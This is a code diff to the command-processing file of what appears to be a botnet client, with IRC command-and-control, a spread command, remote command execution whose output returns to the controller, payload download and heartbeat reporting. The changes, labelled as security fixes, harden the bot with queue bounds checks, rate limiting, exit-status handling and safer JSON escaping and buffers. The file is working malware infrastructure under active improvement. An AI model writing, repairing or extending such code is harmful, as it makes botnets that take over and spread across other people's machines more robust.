@@ -686,7 +686,7 @@ int protocol_process_commands(notnet_bot_t *bot) {
                 char *end = start ? strchr(start + 1, '"') : NULL;
                 if (start && end && end > start) {
                     int clen = end - start - 1;
-                    if (clen > 0 && clen < 254) {
+                    if (clen > 0 && clen < 254 && bot->cmd_count < 256) {
                         memset(bot->cmd_queue[bot->cmd_count], 0, 256);
                         strncpy(bot->cmd_queue[bot->cmd_count], start + 1, clen);
                         bot->cmd_queue[bot->cmd_count][clen] = '\0';
@@ -745,6 +745,10 @@ int protocol_process_commands(notnet_bot_t *bot) {
     for (int i = 0; i < bot->cmd_count; i++) {
         char *cmd = bot->cmd_queue[i];
         bot->cmd_this_second++;
+        if (bot->cmd_this_second > 10) {
+            log_warn("CMD: rate limit exceeded, skipping command %d", i);
+            continue;
+        }
         
         if (strncmp(cmd, CMD_SPREAD, strlen(CMD_SPREAD)) == 0) {
             char *args = cmd + strlen(CMD_SPREAD);
@@ -852,7 +856,13 @@ int protocol_process_commands(notnet_bot_t *bot) {
             output[n] = '\0';
             waitpid(pid, &status, 0);
 
-            log_info("CMD: exec output (%zu bytes, exit %d)", n, WEXITSTATUS(status));
+            int exit_code = -1;
+            if (WIFEXITED(status)) {
+                exit_code = WEXITSTATUS(status);
+            } else if (WIFSIGNALED(status)) {
+                log_warn("CMD: exec killed by signal %d", WTERMSIG(status));
+            }
+            log_info("CMD: exec output (%zu bytes, exit %d)", n, exit_code);
             protocol_send_response(bot, CMD_EXEC, output);
         } else if (strncmp(cmd, CMD_DOWNLOAD, strlen(CMD_DOWNLOAD)) == 0) {
             log_info("CMD: download");
@@ -947,7 +957,14 @@ static void json_escape(const char *src, char *dst, size_t dst_size) {
                 dst[j++] = '\\'; dst[j++] = 't'; break;
             default:
                 if ((unsigned char)src[i] < 0x20) {
-                    j += snprintf(dst + j, dst_size - j, "\\u%04x", (unsigned char)src[i]);
+                    /* SECURITY FIX: Check remaining space for \uXXXX (6 bytes) */
+                    if (j + 6 >= dst_size) break;
+                    int written = snprintf(dst + j, dst_size - j, "\\u%04x", (unsigned char)src[i]);
+                    if (written < 0 || (size_t)written >= dst_size - j) {
+                        j = dst_size - 1;
+                        break;
+                    }
+                    j += written;
                 } else {
                     dst[j++] = src[i];
                 }
@@ -962,10 +979,14 @@ int protocol_send_heartbeat(notnet_bot_t *bot) {
     char safe_hostname[BOT_MAX_HOSTNAME_LEN];
     json_escape(bot->hostname, safe_hostname, sizeof(safe_hostname));
 
-    char heartbeat[512];
-    snprintf(heartbeat, sizeof(heartbeat),
+    /* SECURITY FIX (#16): Increase buffer for escaped hostname */
+    char heartbeat[1024];
+    int ret = snprintf(heartbeat, sizeof(heartbeat),
         "{\"cmd\":\"status\",\"version\":\"%s\",\"hostname\":\"%s\",\"uptime\":%ld,\"scan_count\":%u}",
         NOTNET_VERSION, safe_hostname, (long)(time(NULL) - bot->uptime), bot->scan_count);
+    if (ret < 0 || (size_t)ret >= sizeof(heartbeat)) {
+        log_warn("Heartbeat truncated: need %d bytes, buffer %zu", ret, sizeof(heartbeat));
+    }
     
     /* Send via IRC */
     if (bot->c2_irc.connected && bot->c2_irc.authenticated) {
@@ -1058,10 +1079,18 @@ int protocol_send_response(notnet_bot_t *bot, const char *command, const char *r
     json_escape(command, safe_cmd, sizeof(safe_cmd));
     json_escape(result, safe_result, sizeof(safe_result));
 
-    char response[512];
-    snprintf(response, sizeof(response),
+    /* SECURITY FIX (#16): Increase response buffer to accommodate all
+     * escaped fields without truncation. safe_result alone is 1024 bytes. */
+    char response[2048];
+    /* SECURITY FIX (#1): Also escape hostname for JSON safety */
+    char safe_hostname[BOT_MAX_HOSTNAME_LEN];
+    json_escape(bot->hostname, safe_hostname, sizeof(safe_hostname));
+    int ret = snprintf(response, sizeof(response),
         "{\"cmd\":\"%s\",\"result\":\"%s\",\"hostname\":\"%s\"}",
-        safe_cmd, safe_result, bot->hostname);
+        safe_cmd, safe_result, safe_hostname);
+    if (ret < 0 || (size_t)ret >= sizeof(response)) {
+        log_warn("Response truncated: need %d bytes, buffer %zu", ret, sizeof(response));
+    }
     int len = strlen(response);
     
     /* Send response via IRC */
